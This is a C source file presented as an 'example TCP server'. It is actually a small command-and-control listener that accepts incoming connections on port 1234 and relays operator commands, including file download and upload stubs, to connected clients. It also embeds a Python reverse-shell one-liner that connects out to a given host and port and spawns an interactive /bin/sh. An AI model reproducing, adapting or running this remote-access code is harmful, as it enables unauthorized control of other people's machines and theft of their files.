/*
 *  
 * 
 *  code by Cosmop01tian
 *
 * Example source code of TCP Server.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

char    *shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' & ";

void*	clientProc(void *arg)
{
		int	newsock = (int)arg,ret;
		char	buf[1024];
        char    cmd[200];
        char    newshell[1024];
        int i,j;
		while(1)
		{
            memset(buf,0,1024);
            memset(cmd,0,200);
            printf(">");
            scanf("%s",cmd);
            
            if(strncmp(cmd,"downlocal",9)==0)
            {
                send(newsock,cmd,strlen(cmd),0);
                //start to receive file;
            }else if(strncmp(cmd,"upload",6)==0){
                send(newsock,cmd,strlen(cmd),0);
            }else{
                send(newsock,cmd,strlen(cmd),0);
                ret = read(newsock, buf, sizeof(buf));
                if(ret>0){
                    printf("Received: \n%s", buf);
                }
            }
			
		}
		close(newsock);
}
int main()
{
    static struct sockaddr_in peer;
    int sock, newsock, ret;
    struct sockaddr_in name;
    socklen_t len;
    char buf[1024];
    int16_t port = 1234;
	pthread_t	thread;
	void	*result;
   
    sock = socket (PF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        exit(-1);
    }

  
    name.sin_family = AF_INET;
    name.sin_port = htons (port);
    name.sin_addr.s_addr = htonl (INADDR_ANY);

  
    if (bind(sock, (struct sockaddr *) &name, sizeof(name)) < 0)
    {
        perror("bind");
        exit(-1);
    }

    if (listen(sock, 1) < 0)
    {
        perror("listen");
        exit(-1);
    }
    printf("[*] Server started listen at port: %d\n", port);

    while(1) 
    {
        /* Accept */
        len = sizeof(struct sockaddr);
        newsock = accept(sock, (struct sockaddr *) &peer, &len);
        if (newsock > 0) 
        {
           
            pthread_create(&thread,NULL,clientProc,(void*)newsock);
        }
        
    }

    return 0;
}
